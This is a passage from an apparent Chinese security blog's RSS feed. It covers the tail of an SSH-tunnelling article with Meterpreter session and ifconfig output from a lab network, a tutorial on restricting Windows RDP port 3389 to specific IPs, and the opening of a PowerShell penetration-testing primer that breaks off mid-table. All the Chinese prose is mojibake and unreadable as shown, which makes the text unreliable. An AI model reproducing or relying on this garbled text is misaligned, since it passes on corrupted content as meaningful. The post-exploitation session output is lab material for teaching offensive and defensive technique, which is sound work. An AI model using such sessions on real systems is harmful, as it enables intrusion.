&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;51&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;172.16.0.107:53 -&amp;gt; 172.16.0.107:42804 &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-02-10 15:13:17 +0800
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; ifconfig
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Interface  &lt;span class=&#34;nv&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;============&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name         : Software Loopback Interface &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hardware MAC : 00:00:00:00:00:00
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MTU          : &lt;span class=&#34;m&#34;&gt;4294967295&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPv4 Address : 127.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPv4 Netmask : 255.0.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPv6 Address : ::1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Interface &lt;span class=&#34;nv&#34;&gt;11&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;============&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name         : Intel&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PRO/1000 MT Network Connection
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hardware MAC : 00:0c:29:ad:5b:f3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MTU          : &lt;span class=&#34;m&#34;&gt;1500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPv4 Address : 172.16.0.105
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPv4 Netmask : 255.255.255.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPv6 Address : fe80::7d95:97e1:6b19:c934
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPv6 Netmask : ffff:ffff:ffff:ffff::
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°å…¨ç¨‹æ˜¯èµ°sshåŠ å¯†åè®®çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-é˜²å¾¡sshéš§é“æ”»å‡»&#34;&gt;0x03 é˜²å¾¡SSHéš§é“æ”»å‡»&lt;/h2&gt;
&lt;p&gt;åœ¨ç³»ç»Ÿä¸­é…ç½®SSHè¿œç¨‹ç®¡ç†ç™½åå•ï¼Œåœ¨ACLä¸­é™åˆ¶åªæœ‰ç‰¹å®šçš„IPåœ°å€æ‰èƒ½è¿æ¥SSHï¼Œä»¥åŠè®¾ç½®ç³»ç»Ÿå®Œå…¨ä½¿ç”¨å¸¦å¤–ç®¡ç†ç­‰æ–¹æ³•ï¼Œéƒ½å¯ä»¥é¿å…è¿™ä¸€é—®é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x04-å‚è€ƒ&#34;&gt;0x04 å‚è€ƒ&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/7956&#34;&gt;https://xz.aliyun.com/t/7956&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.c0bra.xyz/2019/10/17/%E5%88%A9%E7%94%A8ssh%E9%9A%A7%E9%81%93%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/&#34;&gt;https://www.c0bra.xyz/2019/10/17/%E5%88%A9%E7%94%A8ssh%E9%9A%A7%E9%81%93%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/7245&#34;&gt;https://xz.aliyun.com/t/7245&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Windowsè®¾ç½®æŒ‡å®šIPè¿œç¨‹è®¿é—®3389</title>
      <link>https://xxe.icu/windows_set_ip_access.html</link>
      <pubDate>Wed, 09 Feb 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/windows_set_ip_access.html</guid>
      
        <description>&lt;h2 id=&#34;0x00-ç®€ä»‹&#34;&gt;0x00 ç®€ä»‹&lt;/h2&gt;
&lt;p&gt;å› ä¸ºè¦åšåè®®éš§é“çš„æµ‹è¯•ï¼Œæ‰€ä»¥é™åˆ¶ä¸€ä¸‹æœ¬åœ°ç¯å¢ƒçš„è®¿é—®æƒé™ï¼Œå»ç½‘ä¸Šä¸€æœéƒ½æ˜¯åƒéä¸€å¾‹çš„æ–‡ç« ï¼Œå…¨æ˜¯æ—§ç³»ç»Ÿçš„å„ç§è½¬è½½ï¼Œæ‰€ä»¥å†™æ­¤ä¸€æ–‡è®°å½•ï¼Œæœ¬æ–‡æ˜¯åœ¨Windows Server 2016ç³»ç»Ÿç¯å¢ƒä¸‹è®¾ç½®åªå…è®¸æŒ‡å®šIPè¿œç¨‹è®¿é—®3389ç«¯å£ã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x01-é€šè¿‡é˜²ç«å¢™é™åˆ¶æŒ‡å®šipè®¿é—®&#34;&gt;0x01 é€šè¿‡é˜²ç«å¢™é™åˆ¶æŒ‡å®šIPè®¿é—®&lt;/h2&gt;
&lt;p&gt;Windowsé˜²ç«å¢™-&amp;gt;é«˜çº§è®¾ç½®-&amp;gt;è¿œç¨‹æ¡Œé¢ - ç”¨æˆ·æ¨¡å¼(TCP-In)-&amp;gt;ä½œç”¨åŸŸ-&amp;gt;è¿œç¨‹IPåœ°å€&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x02-é€šè¿‡è®¾ç½®ipå®‰å…¨ç­–ç•¥é™åˆ¶æŒ‡å®šipè®¿é—®&#34;&gt;0x02 é€šè¿‡è®¾ç½®IPå®‰å…¨ç­–ç•¥é™åˆ¶æŒ‡å®šIPè®¿é—®&lt;/h2&gt;
&lt;h3 id=&#34;1æ‰“å¼€æœ¬åœ°ç»„ç­–ç•¥ç¼–è¾‘å™¨&#34;&gt;1ã€æ‰“å¼€æœ¬åœ°ç»„ç­–ç•¥ç¼–è¾‘å™¨&lt;/h3&gt;
&lt;p&gt;é”®ç›˜win+Rè¾“å…¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gpedit.msc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2æ–°å»ºipå®‰å…¨ç­–ç•¥&#34;&gt;2ã€æ–°å»ºIPå®‰å…¨ç­–ç•¥&lt;/h3&gt;
&lt;p&gt;è®¡ç®—æœºé…ç½®-&amp;gt;Windowsè®¾ç½®-&amp;gt;å®‰å…¨è®¾ç½®-&amp;gt;IPå®‰å…¨ç­–ç•¥&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹ä¸€æ­¥ï¼Œè®¾ç½®ä¸€ä¸‹åç§°ï¼Œè¿™ä¸ªå¯ä»¥éšæ„çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»§ç»­ä¸‹ä¸€æ­¥ï¼Œä¸ç”¨å‹¾é€‰æ¿€æ´»é»˜è®¤ç›¸åº”è§„åˆ™ï¼Œä¸‹ä¸€æ­¥åˆ°ç‚¹å‡»å®Œæˆä¼šå¼¹å‡ºç¼–è¾‘å±æ€§çš„çª—å£ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»æ·»åŠ ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ°éš§é“ç»ˆç»“ç‚¹é»˜è®¤é€‰æ‹©ä¸æŒ‡å®šéš§é“ï¼Œä¸‹ä¸€æ­¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©æ‰€æœ‰ç½‘ç»œè¿æ¥ï¼Œä¸‹ä¸€æ­¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ°äº†è¿™ä¸€æ­¥çš„è®¾ç½®è¿™ä¸ªç­›é€‰æ¡ç›®éœ€è¦åœ¨è„‘æµ·é‡Œæœ‰ä¸ªè®¤è¯†ï¼Œå°±æ˜¯è¦å…ˆè®¾ç½®é˜»æ­¢æ‰€æœ‰IPè®¿é—®3389ç«¯å£çš„ç­›é€‰æ¡ç›®ï¼Œç„¶åå†æ–°å»ºä¸€æ¡ç­›é€‰æ¡ç›®è¿›è¡Œæ”¾è¡ŒæŒ‡å®šIPè®¿é—®3389ç«¯å£ï¼Œç‚¹å‡»æ·»åŠ ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;è®¾ç½®å¥½åç§°åï¼Œç‚¹å‡»æ·»åŠ ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹ä¸€æ­¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŠŠé•œåƒé€‰é¡¹å»æ‰ï¼Œç„¶åä¸‹ä¸€æ­¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//11.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;åŸåœ°å€å’Œç›®æ ‡åœ°å€éƒ½é€‰æ‹©ä»»ä½•IPï¼Œåˆ°IPåè®®ç±»å‹ï¼Œé€‰æ‹©TCPï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ°æ­¤ç«¯å£å¡«å†™3389:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»å®Œæˆå³å¯ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»å®Œæˆäº†ä¸€æ¡ç­›é€‰æ¡ç›®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»ç¡®å®šåä¼šå›åˆ°IPç­›é€‰å™¨åˆ—è¡¨ï¼Œæˆ‘ä»¬å†æ·»åŠ ä¸€æ¡ç­›é€‰æ¡ç›®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//15.png&#34; alt=&#34;15&#34;&gt;&lt;/p&gt;
&lt;p&gt;è®¾ç½®åç§°ï¼Œç‚¹å‡»æ·»åŠ ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//16.png&#34; alt=&#34;16&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ­¥éª¤è·Ÿä¸Šé¢çš„å·®ä¸å¤šï¼Œåªæ˜¯åŸåœ°å€è®¾ç½®ä¸ºä¸€ä¸ªæŒ‡å®šçš„IPï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//17.png&#34; alt=&#34;17&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç›®æ ‡åœ°å€ä¸ºï¼Œæˆ‘çš„IPåœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//18.png&#34; alt=&#34;18&#34;&gt;&lt;/p&gt;
&lt;p&gt;åè®®å’Œç«¯å£å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œå®Œæˆä¹‹åä¼šçœ‹åˆ°æˆ‘ä»¬å·²ç»å»ºç«‹äº†ä¸¤æ¡ç­›é€‰æ¡ç›®ï¼Œæˆ‘ä»¬é€‰æ‹©é˜»æ­¢è¿™ä¸€æ¡ç‚¹ä¸‹ä¸€æ­¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//19.png&#34; alt=&#34;19&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä¼šæ¥åˆ°ç­›é€‰å™¨çš„æ“ä½œè¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬éœ€è¦æ–°å»ºä¸¤ä¸ªæ“ä½œï¼Œä¸€ä¸ªæ˜¯å…è®¸ï¼Œä¸€ä¸ªæ˜¯é˜»æ­¢ã€‚&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»æ·»åŠ ï¼Œç„¶åè®¾ç½®åç§°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//20.png&#34; alt=&#34;20&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©è®¸å¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//21.png&#34; alt=&#34;21&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå†æ·»åŠ ä¸€æ¡é˜»æ­¢çš„ï¼Œè¡Œä¸ºå°±é€‰æ‹©é˜»æ­¢ï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæ“ä½œäº†ï¼Œè·Ÿç€ä¸Šé¢çš„ipç­›é€‰å™¨æ¡ç›®æ˜¯é˜»æ­¢çš„ï¼Œæˆ‘ä»¬è¿™é‡Œå°±é€‰æ‹©é˜»æ­¢æ“ä½œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//22.png&#34; alt=&#34;22&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ·»åŠ äº†ä¸€æ¡é˜»æ­¢æ‰€æœ‰è®¿é—®3389çš„è§„åˆ™ï¼Œæˆ‘ä»¬ç‚¹å‡»æ·»åŠ ï¼Œéƒ½æ˜¯é»˜è®¤ï¼Œåˆ°ç­›é€‰å™¨è¿™é‡Œé€‰æ‹©æ”¾è¡Œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//24.png&#34; alt=&#34;24&#34;&gt;&lt;/p&gt;
&lt;p&gt;è§„åˆ™é€‰æ‹©å…è®¸ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//25.png&#34; alt=&#34;25&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†æˆ‘ä»¬çš„ç­–ç•¥ç¼–è¾‘äº†ï¼Œè™½ç„¶å¾ˆç¹çï½&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//26.png&#34; alt=&#34;26&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹ç¡®å®šå›åˆ°ç­–ç•¥å™¨çš„ç•Œé¢ï¼Œç‚¹å‡»åˆ†é…å³å¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Windows_ip_set//27.png&#34; alt=&#34;27&#34;&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Powershellåœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨</title>
      <link>https://xxe.icu/powershell-attack.html</link>
      <pubDate>Sun, 16 Jan 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/powershell-attack.html</guid>
      
        <description>&lt;h1 id=&#34;ç®€ä»‹&#34;&gt;ç®€ä»‹&lt;/h1&gt;
&lt;p&gt;åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼ŒPowershellè¶Šæ¥è¶Šæˆä¸ºå¿…ä¸å¯å°‘çš„åˆ©ç”¨å·¥å…·ã€‚&lt;/p&gt;
&lt;p&gt;Windowsçš„æ¸—é€è¿‡ç¨‹ä¸­ï¼Œä»¥å‰æˆ‘ä»¬åœ¨2003çš„æœåŠ¡å™¨ä¸­æ¸—é€éƒ½æ˜¯ç”¨vbsã€exeç­‰æ–¹å¼å»æ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦å¯¹è¿™äº›å·¥å…·è¿›è¡Œç¼–ç å’Œå…æ€ï¼Œè¿˜ä¼šå‡ºç°å„ç§é—®é¢˜ã€‚è‡ªä»Windows server 2008 å‡ºæ¥åï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä½¿ç”¨powershellæ“ä½œç«¯å£æ‰«æã€æ–‡ä»¶ä¸‹è½½ã€å‡­è¯è·å–ç­‰åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬æ–‡ä¹Ÿæ˜¯å‚è€ƒäº†å¾å¸ˆå‚…çš„ä¹¦ç±ã€ŠWeb-å®‰å…¨æ”»é˜²ã€‹ä¸€ä¹¦è¿›è¡Œå­¦ä¹ å’Œæ€»ç»“ï¼Œåœ¨ä¹¦ä¸­ä¹Ÿå­¦åˆ°å¾ˆå¤šéå¸¸æœ‰ç”¨çš„å§¿åŠ¿ã€‚&lt;/p&gt;
&lt;h1 id=&#34;powershellåŸºç¡€&#34;&gt;PowerShellåŸºç¡€&lt;/h1&gt;
&lt;h2 id=&#34;powershellç®€ä»‹&#34;&gt;PowerShellç®€ä»‹&lt;/h2&gt;
&lt;p&gt;Powershell æ˜¯è¿è¡Œåœ¨windowsæœºå™¨ä¸Šå®ç°ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºç®¡ç†è‡ªåŠ¨åŒ–çš„å‘½ä»¤è¡Œè„šæœ¬ç¯å¢ƒã€‚ä½ å¯ä»¥æŠŠå®ƒçœ‹æˆæ˜¯å‘½ä»¤è¡Œæç¤ºç¬¦cmd.exeçš„æ‰©å……ï¼Œä¸å¯¹ï¼Œåº”å½“æ˜¯é¢ è¦†ã€‚ powershelléœ€è¦.NETç¯å¢ƒçš„æ”¯æŒï¼ŒåŒæ—¶æ”¯æŒ.NETå¯¹è±¡ã€‚å¾®è½¯ä¹‹æ‰€ä»¥å°†Powershell å®šä½ä¸ºPowerï¼Œå¹¶ä¸æ˜¯å¤¸å¤§å…¶è¯ï¼Œå› ä¸ºå®ƒå®Œå…¨æ”¯æŒå¯¹è±¡ã€‚å…¶å¯è¯»æ€§ï¼Œæ˜“ç”¨æ€§ï¼Œå¯ä»¥ä½å±…å½“å‰æ‰€æœ‰shellä¹‹é¦–ã€‚ å½“å‰powershellæœ‰å››ç‰ˆæœ¬ï¼Œåˆ†åˆ«ä¸º1.0ï¼Œ2.0ï¼Œ3.0 ,4.0ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¦‚æœæ‚¨çš„ç³»ç»Ÿæ˜¯window7æˆ–è€…Windows Server 2008ï¼Œé‚£ä¹ˆPowerShell 2.0å·²ç»å†…ç½®äº†ï¼Œå¯ä»¥å‡çº§ä¸º3.0ï¼Œ4.0ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœæ‚¨çš„ç³»ç»Ÿæ˜¯Windows 8 æˆ–è€…Windows server 2012ï¼Œé‚£ä¹ˆPowerShell 3.0å·²ç»å†…ç½®äº†ï¼Œå¯ä»¥å‡çº§ä¸º4.0ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœæ‚¨çš„ç³»ç»Ÿä¸ºWindows 8.1æˆ–è€…Windows server 2012 R2ï¼Œé‚£é»˜è®¤å·²ç»æ˜¯4.0äº†ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;powershellçš„å¸¸ç”¨å‘½ä»¤&#34;&gt;PowerShellçš„å¸¸ç”¨å‘½ä»¤&lt;/h2&gt;
&lt;p&gt;åœ¨powershellä¸­æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œå‘½åè§„èŒƒé‡‡ç”¨çš„æ˜¯â€œåŠ¨è¯-åè¯â€çš„å½¢å¼ï¼Œæ¯”å¦‚æ–°å»ºæ–‡ä»¶å°±æ˜¯&lt;code&gt;New-Iterm test.txt&lt;/code&gt;,ä¹Ÿå¯ä»¥åœ¨powershellä¸­æ‰§è¡Œç±»ä¼¼Linuxçš„å‘½ä»¤ï¼Œæ¯”å¦‚lsã€catç­‰ï¼Œä¸‹é¢æ˜¯ä¸€äº›åŸºæœ¬çš„å¸¸ç”¨å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;New-Item éœ€è¦åˆ›å»ºçš„ç›®å½• Type Directory   #åˆ›å»ºç›®å½•
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;New-Item éœ€è¦åˆ›å»ºçš„æ–‡ä»¶ Type File        #åˆ›å»ºæ–‡ä»¶
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Remove-Item å·²å­˜åœ¨ç›®å½•                  #åˆ é™¤ç›®å½•
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Get-Content å·²å­˜åœ¨æ–‡ä»¶                  #æŸ¥çœ‹æ–‡ä»¶
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Content å·²å­˜åœ¨æ–‡ä»¶ &amp;#34;hello&amp;#34;          #ç»™æ–‡ä»¶æ·»åŠ å†…å®¹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Add-Content å·²å­˜åœ¨æ–‡ä»¶ &amp;#34;hello&amp;#34;          #ç»™æ–‡ä»¶è¿½åŠ å†…å®¹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Clear-Content å·²å­˜åœ¨æ–‡ä»¶                #æ¸…é™¤æ–‡ä»¶å†…å®¹
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;powershellä¸å…¶ä»–å‘½ä»¤è§£é‡Šå™¨çš„æ¯”è¾ƒ&#34;&gt;PowerShellä¸å…¶ä»–å‘½ä»¤è§£é‡Šå™¨çš„æ¯”è¾ƒ&lt;/h3&gt;
&lt;p&gt;å‚è€ƒ&lt;a href=&#34;https://zh.wikipedia.org/wiki/PowerShell&#34;&gt;Powershell_Wiki&lt;/a&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;PowerShellï¼ˆå‘½ä»¤è¡Œï¼‰&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;PowerShellï¼ˆåˆ«åï¼‰&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6&#34;&gt;å‘½ä»¤æç¤ºç¬¦&lt;/a&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Unix_shell&#34;&gt;Unix shell&lt;/a&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Get-ChildItem&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;gci, dir, ls&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Dir_(%E5%91%BD%E4%BB%A4)&#34;&gt;dir&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Ls&#34;&gt;ls&lt;/a&gt;&lt;/td&gt;
